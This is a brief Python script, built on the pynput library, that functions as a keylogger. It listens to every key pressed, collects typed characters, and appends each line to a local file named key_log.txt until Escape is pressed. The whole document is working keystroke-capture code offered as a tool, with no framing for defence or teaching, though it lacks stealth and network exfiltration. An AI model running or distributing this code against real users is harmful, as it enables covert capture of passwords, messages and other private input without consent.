import pynput
from pynput.keyboard import Key, Listener

# Specify the file to log keystrokes
log_file = "key_log.txt"

# To keep track of the current word
current_word = []


def on_press(key):
    global current_word

    try:
        if key.char:  # Check if the key is a character
            current_word.append(key.char)
    except AttributeError:
        if key == Key.space:
            current_word.append(' ')
        elif key == Key.enter:
            # Join the current word and log it
            with open(log_file, "a") as f:
                f.write(''.join(current_word) + '\n')
            current_word = []  # Reset the current word


def on_release(key):
    # Exit the keylogger on pressing the escape key
    if key == Key.esc:
        # Make sure to log the last word if not empty
        if current_word:
            with open(log_file, "a") as f:
                f.write(''.join(current_word) + '\n')
        return False


# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
